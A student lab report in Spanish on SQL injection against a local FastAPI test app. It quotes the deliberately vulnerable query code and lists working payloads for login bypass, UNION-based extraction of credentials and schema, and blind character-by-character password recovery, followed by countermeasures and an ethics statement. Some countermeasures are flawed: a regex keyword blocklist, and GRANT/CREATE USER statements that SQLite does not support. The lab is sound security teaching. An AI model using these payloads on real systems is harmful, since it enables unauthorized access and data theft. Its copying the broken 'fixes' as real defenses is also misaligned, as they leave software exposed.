Laboratorio SQL Injection - Análisis de Vulnerabilidades
Información del Equipo
Integrante 1: [Jhon Velasco] - [jhonAleVelasco]
Integrante 1: [Juan David Jimenez] 

Fecha: [04/10/2025]

1. Instalación y Configuración
Requisitos del Sistema
bash
# Python 3.8 o superior
python --version

# Verificar instalación de pip
pip --version
Instalación Paso a Paso
bash
# 1. Crear directorio del proyecto
mkdir sql-injection-lab
cd sql-injection-lab

# 2. Crear entorno virtual (recomendado)
python -m venv venv
source venv/bin/activate  # Linux/Mac
# venv\Scripts\activate  # Windows

# 3. Instalar dependencias
pip install fastapi==0.104.1 uvicorn[standard]==0.24.0 jinja2==3.1.2 python-multipart==0.0.6

# 4. Crear estructura de archivos
mkdir templates static

# 5. Guardar los archivos en sus respectivas ubicaciones:
# - main.py (en raíz)
# - database.py (en raíz) 
# - templates/*.html (en directorio templates)
# - static/style.css (en directorio static)

# 6. Ejecutar la aplicación
python main.py
Verificación de Instalación
bash
# Verificar que la base de datos se crea correctamente
python database.py

# Acceder a la aplicación en:
# http://localhost:8000
Archivos Requeridos
main.py - Aplicación FastAPI principal
database.py - Inicialización de base de datos
templates/index.html - Página principal
templates/login.html - Ejercicio 1
templates/search.html - Ejercicio 2
static/style.css - Estilos CSS

2. Vulnerabilidades Identificadas
2.1 Login Bypass
Ubicación: main.py - Función login_vulnerable()

python
# 🚨 CÓDIGO VULNERABLE - Concatenación directa
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
Características de la vulnerabilidad:

Entradas del usuario concatenadas directamente en la consulta SQL

No hay validación ni sanitización de inputs

Permite comentarios SQL (--) que ignoran parte de la consulta

Uso de condiciones OR para evadir autenticación

2.2 Union-Based Injection
Ubicación: main.py - Función search_vulnerable()

python
# 🚨 CÓDIGO VULNERABLE - LIKE con concatenación
query = f"SELECT id, name, price, description FROM products WHERE name LIKE '%{search_term}%'"
Características de la vulnerabilidad:

Término de búsqueda insertado directamente en cláusula LIKE

Permite uso de UNION SELECT para combinar consultas

No hay validación del número o tipo de columnas

Exposición de estructura de base de datos mediante errores

2.3 Blind SQL Injection
Ubicación: main.py - Función get_user_vulnerable()

python
# 🚨 CÓDIGO VULNERABLE - Parámetro sin sanitizar
query = f"SELECT username FROM users WHERE id='{user_id}'"
Características de la vulnerabilidad:

Parámetro de ruta usado directamente en consulta

Respuestas booleanas (usuario encontrado/no encontrado)

Permite extracción de datos carácter por carácter

No hay manejo seguro de parámetros

3. Técnicas de Explotación y Evidencias
3.1 Login Bypass - Ejercicio 1
Payload 1: Comentario SQL Simple

sql
Usuario: admin' --
Contraseña: [cualquier valor]
Query resultante:

sql
SELECT * FROM users WHERE username='admin' -- ' AND password='x'
Evidencia esperada:

Acceso concedido como usuario 'admin'

Mensaje: "¡SQL Injection Exitoso!"

Rol: administrator

Payload 2: Condición OR Always True

sql
Usuario: ' OR '1'='1' --
Contraseña: [cualquier valor]
Query resultante:

sql
SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password='x'
Evidencia esperada:

Acceso como primer usuario de la tabla

Retorna usuario 'admin' o 'user1'

Payload 3: Inyección con UNION

sql
Usuario: ' UNION SELECT 1,'injected_user','pass','injected@test.com','admin' --
Contraseña: x
Query resultante:

sql
SELECT * FROM users WHERE username='' UNION SELECT 1,'injected_user','pass','injected@test.com','admin' -- ' AND password='x'
Evidencia esperada:

Creación de usuario administrativo ficticio

Acceso con credenciales inyectadas

3.2 Union-Based Injection - Ejercicio 2
Payload 1: Determinar Número de Columnas

sql
Búsqueda: ' ORDER BY 5 --
Evidencia esperada:

Si ORDER BY 5 da error: la tabla tiene 4 columnas

Si no da error, probar números mayores hasta encontrar el límite

Payload 2: Extraer Credenciales de Usuarios

sql
Búsqueda: ' UNION SELECT id,username,password,email FROM users --
Query resultante:

sql
SELECT id, name, price, description FROM products WHERE name LIKE '%' UNION SELECT id,username,password,email FROM users --%'
Evidencia esperada:

Lista completa de usuarios y contraseñas en claro

Se muestran junto con los productos en resultados de búsqueda

Payload 3: Extraer Estructura de la Base de Datos

sql
Búsqueda: ' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type='table' --
Evidencia esperada:

Muestra el esquema CREATE TABLE de todas las tablas

Revela nombres de columnas y tipos de datos

Payload 4: Contar Usuarios

sql
Búsqueda: ' UNION SELECT COUNT(*),'usuarios',3,4 FROM users --
Evidencia esperada:

Muestra el número total de usuarios en la base de datos

3.3 Blind SQL Injection - Ejercicio 3
Payload 1: Verificación de Vulnerabilidad

sql
URL: /user/1' AND '1'='1
Evidencia esperada:

Respuesta: {"status":"success","message":"Usuario encontrado"}

sql
URL: /user/1' AND '1'='2
Evidencia esperada:

Respuesta: {"status":"not_found","message":"Usuario no encontrado"}

Payload 2: Extracción de Longitud de Contraseña

sql
URL: /user/1' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=8 --
Evidencia esperada:

Si respuesta es éxito: longitud de contraseña es 8 caracteres

Probar diferentes longitudes hasta encontrar la correcta

Payload 3: Extracción Carácter por Carácter

sql
URL: /user/1' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a' --
Evidencia esperada:

Si respuesta es éxito: primer carácter es 'a'

Repetir para cada posición y carácter hasta obtener contraseña completa

Payload 4: Verificación de Privilegios

sql
URL: /user/1' AND (SELECT role FROM users WHERE username='admin')='administrator' --
Evidencia esperada:

Confirmación de que el usuario admin tiene rol administrator

4. Análisis de Impacto y Contramedidas
4.1 Análisis de Impacto
Vulnerabilidad	Impacto	Severidad	Vector Ataque
Login Bypass	Acceso administrativo no autorizado	Crítico	Autenticación
Union-Based	Exfiltración completa de BD	Crítico	Confidencialidad
Blind Injection	Extracción de información sensible	Alto	Confidencialidad
Consecuencias Identificadas:

Exposición de credenciales de usuario

Acceso a datos personales y sensibles

Posibilidad de elevación de privilegios

Compromiso total de la base de datos

4.2 Contramedidas Técnicas
Solución 1: Consultas Parametrizadas

python
# ✅ SOLUCIÓN SEGURA - Login
def login_seguro(username: str, password: str):
    conn = get_connection()
    cursor = conn.cursor()
    
    # Consulta parametrizada
    query = "SELECT * FROM users WHERE username=? AND password=?"
    cursor.execute(query, (username, password))
    
    result = cursor.fetchone()
    conn.close()
    return result

# ✅ SOLUCIÓN SEGURA - Búsqueda
def buscar_productos_seguro(termino: str):
    conn = get_connection()
    cursor = conn.cursor()
    
    query = "SELECT id, name, price, description FROM products WHERE name LIKE ?"
    cursor.execute(query, (f"%{termino}%",))
    
    resultados = cursor.fetchall()
    conn.close()
    return resultados

# ✅ SOLUCIÓN SEGURA - Blind
def obtener_usuario_seguro(user_id: int):
    conn = get_connection()
    cursor = conn.cursor()
    
    query = "SELECT username FROM users WHERE id=?"
    cursor.execute(query, (user_id,))
    
    resultado = cursor.fetchone()
    conn.close()
    return resultado
Solución 2: Validación y Sanitización de Entradas

python
import re

def validar_entrada_sql(input_str: str) -> bool:
    """
    Valida que la entrada no contenga patrones de SQL injection
    """
    patrones_peligrosos = [
        r".*'.*--",           # Comentarios SQL
        r".*union.*select",   # UNION SELECT
        r".*or.*=.*",         # Condiciones OR
        r".*;.*",             # Múltiples consultas
        r".*drop.*",          # Comandos DROP
        r".*delete.*",        # Comandos DELETE
        r".*update.*",        # Comandos UPDATE
        r".*insert.*",        # Comandos INSERT
        r".*--.*",            # Comentarios
        r".*/\*.*\*/"         # Comentarios de bloque
    ]
    
    for patron in patrones_peligrosos:
        if re.match(patron, input_str, re.IGNORECASE):
            return False
    
    return True

def sanitizar_entrada(input_str: str) -> str:
    """
    Sanitiza entrada removiendo caracteres peligrosos
    """
    caracteres_peligrosos = ["'", "\"", ";", "--", "/*", "*/"]
    sanitized = input_str
    
    for char in caracteres_peligrosos:
        sanitized = sanitized.replace(char, "")
    
    return sanitized
Solución 3: Middleware de Seguridad

python
from fastapi import Request, HTTPException
from fastapi.middleware import Middleware

class SQLInjectionMiddleware:
    async def __call__(self, request: Request, call_next):
        # Verificar parámetros de query
        for param_name, param_value in request.query_params.items():
            if not validar_entrada_sql(param_value):
                raise HTTPException(
                    status_code=400, 
                    detail="Entrada no válida detectada en parámetros de consulta"
                )
        
        # Verificar datos de formulario
        if request.method in ["POST", "PUT"]:
            form_data = await request.form()
            for field_name, field_value in form_data.items():
                if not validar_entrada_sql(field_value):
                    raise HTTPException(
                        status_code=400,
                        detail=f"Entrada no válida detectada en campo {field_name}"
                    )
        
        response = await call_next(request)
        return response
Solución 4: Principio de Mínimo Privilegio

python
def crear_usuario_bd_restringido():
    """
    Crea usuario de BD con permisos mínimos necesarios
    """
    conn = sqlite3.connect('vulnerable_app.db')
    cursor = conn.cursor()
    
    # Solo permisos SELECT en tablas necesarias
    cursor.execute("""
        PRAGMA foreign_keys=OFF;
        BEGIN TRANSACTION;
        
        -- Crear usuario con permisos restringidos
        CREATE USER 'app_user' IDENTIFIED BY 'StrongPassword123!';
        
        -- Solo permisos SELECT en tabla products
        GRANT SELECT ON products TO 'app_user';
        
        -- Solo permisos SELECT en columnas específicas de users
        GRANT SELECT (id, username, email, role) ON users TO 'app_user';
        
        COMMIT;
    """)
    
    conn.commit()
    conn.close()
Solución 5: Logging y Monitoreo

python
import logging
from datetime import datetime

def configurar_logging_seguridad():
    logging.basicConfig(
        filename='security.log',
        level=logging.WARNING,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )

def log_intento_sql_injection(request: Request, payload: str):
    logger = logging.getLogger('security')
    logger.warning(
        f"Intento de SQL Injection detectado - "
        f"IP: {request.client.host} - "
        f"Payload: {payload} - "
        f"Endpoint: {request.url.path}"
    )
5. Reflexión Ética del Equipo
5.1 Principios Éticos Aplicados
Consentimiento y Autorización

Este laboratorio se ejecuta exclusivamente en entornos controlados propios

Todas las pruebas se realizan contra sistemas bajo nuestro control

No se realizan pruebas contra sistemas de terceros sin autorización explícita

Propósito Educativo

El objetivo principal es comprender vulnerabilidades para poder prevenirlas

Desarrollo de habilidades en detección y mitigación de amenazas

Fomento de prácticas de codificación segura desde el diseño

Responsabilidad Profesional

python
# Código de conducta ético implícito
PRINCIPIOS_ETICOS = {
    "autorizacion": "Siempre obtener permiso por escrito antes de realizar pruebas",
    "confidencialidad": "No exponer ni compartir datos obtenidos durante pruebas",
    "minimizacion": "No causar interrupciones o daños a sistemas en producción",
    "reporte": "Reportar vulnerabilidades de forma responsable y discreta",
    "educacion": "Compartir conocimiento para mejorar la seguridad colectiva"
}
5.2 Aprendizajes Obtenidos
Conciencia sobre Seguridad:

Comprensión profunda de cómo los atacantes explotan vulnerabilidades SQL

Reconocimiento de patrones de código vulnerable en aplicaciones web

Importancia crítica de la validación y sanitización de entradas

Habilidades Técnicas Desarrolladas:

Implementación correcta de consultas parametrizadas

Configuración de defensas en profundidad (defense in depth)

Uso de herramientas y técnicas de detección temprana

Análisis de logs y monitoreo de actividades sospechosas

Responsabilidad Profesional:

El conocimiento conlleva responsabilidad - estas técnicas solo para defensa

Importancia del disclosure responsable de vulnerabilidades

Necesidad de educación continua en seguridad ofensiva y defensiva

5.3 Compromisos del Equipo
Como equipo de desarrollo/seguridad, nos comprometemos a:

Uso Ético del Conocimiento

Utilizar estas técnicas solo en entornos autorizados y controlados

Nunca explotar vulnerabilidades en sistemas sin permiso explícito

Implementación de Mejores Prácticas

Adoptar consultas parametrizadas en todos nuestros proyectos

Implementar validación de entrada en todas las capas de la aplicación

Seguir el principio de mínimo privilegio en accesos a base de datos

Educación y Concientización

Capacitar a otros desarrolladores sobre riesgos de SQL injection

Compartir hallazgos y lecciones aprendidas con la comunidad

Promover la cultura de seguridad desde las etapas iniciales del desarrollo

Mejora Continua

Mantenernos actualizados en nuevas técnicas de ataque y defensa

Realizar pruebas de seguridad periódicas en nuestras aplicaciones

Participar en programas de bug bounty de forma ética

5.4 Consideraciones Legales y Profesionales
Aspectos Legales:

Las pruebas de penetración requieren autorización explícita por escrito

El acceso no autorizado a sistemas computacionales es un delito en la mayoría de países

Es esencial contar con un acuerdo de alcance (scope agreement) antes de realizar pruebas

Responsabilidad Social:

Como profesionales de TI, tenemos la obligación de proteger la información de usuarios

Debemos promover la seguridad como un derecho digital fundamental

El conocimiento en seguridad debe usarse para construir, no para destruir

Declaración Final: Este laboratorio tiene exclusivamente fines educativos. El uso malicioso de estas técnicas es ilegal, antiético y contrario a los principios profesionales. Instamos a todos los usuarios a emplear este conocimiento para mejorar la seguridad de los sistemas y proteger la privacidad de los usuarios.
